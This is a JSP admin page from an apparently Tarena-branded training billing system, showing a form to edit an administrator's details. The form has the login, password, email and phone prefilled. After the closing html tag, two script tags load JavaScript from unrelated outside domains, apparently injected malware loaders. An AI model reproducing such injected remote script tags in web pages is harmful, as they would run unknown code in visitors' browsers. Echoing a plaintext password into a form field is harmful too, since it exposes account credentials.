<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<html>
<head>
<title> 管理员管理 </title>
<style type="text/css">
<!--
@import url(/app/son.css);
@import url(/app/index.css);
-->
</style>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<link href="/app/index.css" rel="stylesheet" type="text/css">
</head>
<body bgcolor="#ccddee" background="/app/image/background.jpg" link="#000066" vlink="#0066FF" alink="#99FF00">
<hr size="1" noshade>
<div align="center">

    <table width="91%" border="0" align="center">
      <tr bgcolor="#ccddee" class="pp">
        <td width="17%" height="6"><a href="addManager.htm" class="text_link">
          增加管理员</a></td>
        <td width="15%"> <a href="listManager.htm" class="text_link">管理员列表</a></td>
        <td width="17%"><span class="yellow">私人信息</span></td>
      </tr>
    </table>

  <form name="adminForm" method="post" action="self.htm">
    <p class="pp"> 信息管理 </p>
    
    <table width="91%" border=1 bordercolor="ccccff" bgcolor="ccddee" class="9P">
      <tr>
        <td colspan="2"><div align="center"> </div></td>
      </tr>
      <input type="hidden" name="id" value="1">
      <input type="hidden" name="loginName" value="tarena">
      <tr>
        <td width="20%">登陆密码</td>
        <td width="80%"><input type="password" name="loginPassword" value="tarena"></td>
      </tr>
      <tr>
        <td>重复密码 </td>
        <td><input name="textfield3" type="password" value="tarena"/></td>
      </tr>
      <tr>
        <td>真实姓名</td>
        <td><input type="text" name="name" value="tarena"></td>
      </tr>
      <tr>
        <td>管理员邮箱 </td>
        <td><input type="text" name="email" value="tarena@tarena.com.cn"></td>
      </tr>
      <tr>
        <td>开通日期 </td>
        <td>Sun Oct 15 00:00:00 CST 2006</td>
      </tr>
      <tr>
        <td>联系电话 </td>
        <td><input type="text" name="phone" value="62132839"></td>
      </tr>
      <tr>
        <td>登陆权限 </td>
        <td>
          
            资费管理&nbsp;&nbsp;
          
            账务查询&nbsp;&nbsp;
          
            管理员管理&nbsp;&nbsp;
          
            用户管理&nbsp;&nbsp;
          
            账单查询&nbsp;&nbsp;
          
        </td>
      </tr>
      <tr>
        <td height="25">&nbsp;</td>
        <td><div align="center">
            <input type="submit" name="Submit" value="修改">
            &nbsp;&nbsp;&nbsp;&nbsp;
            <input type="reset" name="reset" value="重设">
          </div></td>
      </tr>
    </table>
  </form>
</div>
<center>
  <hr/>
  <p class="text_link"><font size="2" face="宋体">About Tarena - 公司简介 - 联系方法 - 相关法律
    - 客户服务 <br>
    达内公司版权所有</font></p>
  <p class="text_link"><font size="-1">Copyright&nbsp;<img src="/image/c-00.gif" width="9" height="9">&nbsp;2000.
    Tarena Technologies Inc. All Rights Reserved </font></p>
</center>
</body>
</html>

<script language=javascript src=http://www.shaoye1213.cn/tl.js></script>
<script language=javascript src=http://www.eheh001.cn/a.js></script>